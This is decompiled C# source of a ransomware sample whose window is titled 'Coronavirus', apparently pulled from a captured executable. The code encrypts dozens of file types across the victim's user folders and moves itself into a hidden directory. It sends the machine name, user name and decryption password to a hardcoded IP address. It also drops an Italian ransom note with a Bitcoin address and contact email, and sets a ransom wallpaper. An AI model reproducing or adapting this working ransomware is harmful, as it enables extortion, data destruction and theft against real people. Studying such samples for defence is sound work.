﻿// Decompiled with JetBrains decompiler
// Type: fuckunicorn.Form1
// Assembly: IMMUNI, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8F54C700-FA0D-46F7-BC53-7208912E7089
// Assembly location: C:\Users\Administrateur\Desktop\7980ef30b9bed26a9823d3dd5746cdefe5d01de2b2eb2c5e17dbfd1fd52f62bf.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace fuckunicorn
{
  public class Form1 : Form
  {
    private string targetURL = "http://116.203.210.127/write.php";
    private string userName = Environment.UserName;
    private string computerName = Environment.MachineName.ToString();
    private string userDir = "C:\\";
    private string backgroundImageUrl = "https://i.imgur.com/6bDNKfs.jpg";
    private IContainer components;
    private PictureBox pictureBox1;
    private Button button1;

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      uint action,
      uint uParam,
      string vParam,
      uint winIni);

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Opacity = 100.0;
      this.ShowInTaskbar = false;
      this.startAction();
    }

    protected override CreateParams CreateParams
    {
      get
      {
        CreateParams createParams = base.CreateParams;
        createParams.ExStyle |= 128;
        return createParams;
      }
    }

    private void Form_Shown(object sender, EventArgs e)
    {
      this.Visible = true;
      this.Opacity = 100.0;
    }

    public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          return memoryStream.ToArray();
        }
      }
    }

    public string CreatePassword(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()".Length)]);
      return stringBuilder.ToString();
    }

    public void SendPassword(string password)
    {
      try
      {
        new WebClient().DownloadString(this.targetURL + ("?computer_name=" + this.computerName + "&userName=" + this.userName + "&password=" + password + "&allow=ransom"));
      }
      catch (Exception ex)
      {
      }
    }

    public void EncryptFile(string file, string password)
    {
      byte[] bytesToBeEncrypted = System.IO.File.ReadAllBytes(file);
      byte[] bytes1 = Encoding.UTF8.GetBytes(password);
      byte[] hash = SHA256.Create().ComputeHash(bytes1);
      byte[] bytes2 = this.AES_Encrypt(bytesToBeEncrypted, hash);
      string path = this.userDir + ("Users\\" + this.userName + "\\Desktop\\READ_IT.txt.fuckunicornhtrhrtjrjy");
      if (System.IO.File.Exists(path))
        System.IO.File.Delete(path);
      System.IO.File.WriteAllBytes(file, bytes2);
      System.IO.File.Move(file, file + ".fuckunicornhtrhrtjrjy");
    }

    public void encryptDirectory(string location, string password)
    {
      try
      {
        string[] source = new string[68]
        {
          ".txt",
          ".jar",
          ".exe",
          ".dat",
          ".contact",
          ".settings",
          ".doc",
          ".docx",
          ".xls",
          ".xlsx",
          ".ppt",
          ".pptx",
          ".odt",
          ".jpg",
          ".png",
          ".csv",
          ".py",
          ".sql",
          ".mdb",
          ".sln",
          ".php",
          ".asp",
          ".aspx",
          ".html",
          ".htm",
          ".xml",
          ".psd",
          ".pdf",
          ".dll",
          ".c",
          ".cs",
          ".mp3",
          ".mp4",
          ".f3d",
          ".dwg",
          ".cpp",
          ".zip",
          ".rar",
          ".mov",
          ".rtf",
          ".bmp",
          ".mkv",
          ".avi",
          ".apk",
          ".lnk",
          ".iso",
          ".7-zip",
          ".ace",
          ".arj",
          ".bz2",
          ".cab",
          ".gzip",
          ".lzh",
          ".tar",
          ".uue",
          ".xz",
          ".z",
          ".001",
          ".mpeg",
          ".mp3",
          ".mpg",
          ".core",
          ".crproj",
          ".pdb",
          ".ico",
          ".pas",
          ".db",
          ".torrent"
        };
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int index = 0; index < files.Length; ++index)
        {
          string extension = Path.GetExtension(files[index]);
          if (((IEnumerable<string>) source).Contains<string>(extension))
            this.EncryptFile(files[index], password);
        }
        for (int index = 0; index < directories.Length; ++index)
          this.encryptDirectory(directories[index], password);
      }
      catch (Exception ex)
      {
      }
    }

    public void MoveVirus()
    {
      string path = this.userDir + this.userName + "\\Rand123";
      string str1 = this.userDir + this.userName + "\\Rand123\\local.exe";
      if (!Directory.Exists(path))
        Directory.CreateDirectory(path);
      else if (System.IO.File.Exists(str1))
        System.IO.File.Delete(str1);
      string str2 = "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
      System.IO.File.Move(Directory.GetCurrentDirectory() + str2, str1);
    }

    public static bool CheckForInternetConnection()
    {
      try
      {
        using (WebClient webClient = new WebClient())
        {
          using (webClient.OpenRead("https://www.google.com"))
            return true;
        }
      }
      catch
      {
        return false;
      }
    }

    public void startAction()
    {
      this.MoveVirus();
      string password = this.CreatePassword(15);
      this.Directory_Settings_Sending(password);
      this.messageCreator();
      string path = this.userDir + this.userName + "\\ransom.jpg";
      bool flag;
      do
      {
        flag = Form1.CheckForInternetConnection();
        if (flag)
        {
          this.SetWallpaperFromWeb(this.backgroundImageUrl, path);
          this.SendPassword(password);
        }
      }
      while (!flag);
    }

    public void Directory_Settings_Sending(string password)
    {
      string str = "Users\\";
      string location1 = this.userDir + str + this.userName + "\\Desktop";
      string location2 = this.userDir + str + this.userName + "\\Links";
      string location3 = this.userDir + str + this.userName + "\\Contacts";
      string location4 = this.userDir + str + this.userName + "\\Desktop";
      string location5 = this.userDir + str + this.userName + "\\Documents";
      string location6 = this.userDir + str + this.userName + "\\Downloads";
      string location7 = this.userDir + str + this.userName + "\\Pictures";
      string location8 = this.userDir + str + this.userName + "\\Music";
      string location9 = this.userDir + str + this.userName + "\\OneDrive";
      string location10 = this.userDir + str + this.userName + "\\Saved Games";
      string location11 = this.userDir + str + this.userName + "\\Favorites";
      string location12 = this.userDir + str + this.userName + "\\Searches";
      string location13 = this.userDir + str + this.userName + "\\Videos";
      this.encryptDirectory(location1, password);
      this.encryptDirectory(location2, password);
      this.encryptDirectory(location3, password);
      this.encryptDirectory(location4, password);
      this.encryptDirectory(location5, password);
      this.encryptDirectory(location6, password);
      this.encryptDirectory(location7, password);
      this.encryptDirectory(location8, password);
      this.encryptDirectory(location9, password);
      this.encryptDirectory(location10, password);
      this.encryptDirectory(location11, password);
      this.encryptDirectory(location12, password);
      this.encryptDirectory(location13, password);
    }

    public void messageCreator()
    {
      string path = this.userDir + "Users\\" + this.userName + "\\Desktop\\READ_IT.txt";
      string str = this.computerName + "-" + this.userName;
      string[] contents = new string[8]
      {
        "La lunga serpe sul bastone di Asceplio si è ribellata, ed una nuova era sta per sopraggiungere!",
        "Questa è la vostra possibilità per redimervi dopo anni di peccati e soprusi.",
        "Sta a voi scegliere. Entro 3 giorni il pegno pagare dovrai o il fuoco di Prometeo cancellerà",
        "i vostri dati così come ha cancellato il potere degli Dei sugli uomini.  Il pegno è di solamente 300 euros, da pagare",
        "con i Bitcoin al seguente indirizzo : 195naAM74WpLtGHsKp9azSsXWmBCaDscxJ dopo che pagato avrai, ",
        "una email mandarci dovrai. xxcte2664@protonmail.com il codice di transazione sarà la prova.",
        "Dopo il pegno pagato riceverai la soluzione per spegnere il fuoco di Prometeo. Andare dalla ",
        "polizia o chiamare tecnici a niente servirà, nessun essere umano aiutarti potrà."
      };
      System.IO.File.WriteAllLines(path, contents);
    }

    public void SetWallpaper(string path) => Form1.SystemParametersInfo(20U, 0U, path, 3U);

    private void SetWallpaperFromWeb(string url, string path)
    {
      try
      {
        new WebClient().DownloadFile(new Uri(url), path);
        this.SetWallpaper(path);
      }
      catch (Exception ex)
      {
      }
    }

    private void pictureBox1_Click(object sender, EventArgs e)
    {
    }

    private void button1_Click(object sender, EventArgs e) => this.Close();

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.pictureBox1 = new PictureBox();
      this.button1 = new Button();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.pictureBox1.BackgroundImage = (Image) componentResourceManager.GetObject("pictureBox1.BackgroundImage");
      this.pictureBox1.Location = new Point(-2, -6);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(1074, 691);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
      this.pictureBox1.TabIndex = 0;
      this.pictureBox1.TabStop = false;
      this.pictureBox1.Click += new EventHandler(this.pictureBox1_Click);
      this.button1.Location = new Point(1023, 12);
      this.button1.Name = "button1";
      this.button1.Size = new Size(29, 23);
      this.button1.TabIndex = 1;
      this.button1.Text = "X";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(1064, 681);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.pictureBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Form1);
      this.Text = "Coronavirus";
      this.UseWaitCursor = true;
      this.Load += new EventHandler(this.Form1_Load);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
    }
  }
}
